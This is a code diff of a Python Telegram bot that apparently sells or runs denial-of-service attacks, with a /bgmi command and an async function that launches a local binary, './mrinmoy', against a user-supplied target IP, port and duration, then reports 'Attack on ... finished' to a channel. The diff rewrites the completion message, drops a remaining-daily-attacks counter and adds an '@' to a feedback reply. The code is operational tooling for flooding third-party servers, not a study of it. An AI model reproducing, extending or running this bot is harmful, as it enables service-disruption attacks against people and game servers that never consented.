@@ -62,7 +62,7 @@ def handle_photo(message):
     # Send confirmation message for feedback received
     bot.send_message(
         message.chat.id,
-        f"✅ 𝙃𝙞 📸 𝙁𝙀𝙀𝘿𝘽𝙖𝘾𝙆 𝙍𝙚𝘾𝙀𝙄𝙑𝙚𝘿 𝙁𝙍𝙤𝙈 𝙐𝙎𝙚𝙍 :- {message.from_user.first_name}, . ✅"
+        f"✅ 𝙃𝙞 📸 𝙁𝙀𝙀𝘿𝘽𝙖𝘾𝙆 𝙍𝙚𝘾𝙀𝙄𝙑𝙚𝘿 𝙁𝙍𝙤𝙈 𝙐𝙎𝙚𝙍 :- @{message.from_user.first_name}, . ✅"
     )
 
 @bot.message_handler(commands=['bgmi'])
@@ -176,10 +176,7 @@ async def run_attack_command_async(target_ip, target_port, duration, user_durati
         command = f"./mrinmoy {target_ip} {target_port} {duration} 877"
         process = await asyncio.create_subprocess_shell(command)
         await process.communicate()
-remaining_attacks = DAILY_ATTACK_LIMIT - user_attacks.get(user_id, 0)
-
-bot.send_message(CHANNEL_ID, f"🚀 𝘼𝙩𝙩𝙖𝙘𝙠 FINISHED {target_ip} : {target_port}  𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙 ✅ [ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨.\n\n𝗧𝗵𝗮𝗻𝗸𝗬𝗼𝘂 𝗙??𝗿 𝘂𝘀𝗶𝗻𝗴 𝗢𝘂𝗿 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 <> 𝗧𝗲𝗮𝗺 TF-FLASH™ \n\nOR BHAI TERA 𝙍𝙀𝙈𝘼𝙄𝙉𝙄𝙉𝙂 𝘼𝙏𝙏𝘼𝘾K : {remaining_attacks}")
-
+        bot.send_message(CHANNEL_ID, f"🚀 𝘼𝙩𝙩𝙖𝙘𝙠 𝙤𝙣 {target_ip} : {target_port}  𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙 ✅ [ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨.\n\n𝗧𝗵𝗮𝗻𝗸𝗬𝗼𝘂 𝗙𝗼𝗿 𝘂𝘀𝗶𝗻𝗴 𝗢𝘂𝗿 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 <> 𝗧𝗲𝗮𝗺 TF-FLASH™")
     except Exception as e:
         bot.send_message(CHANNEL_ID, f"Error running attack command: {e}")
 
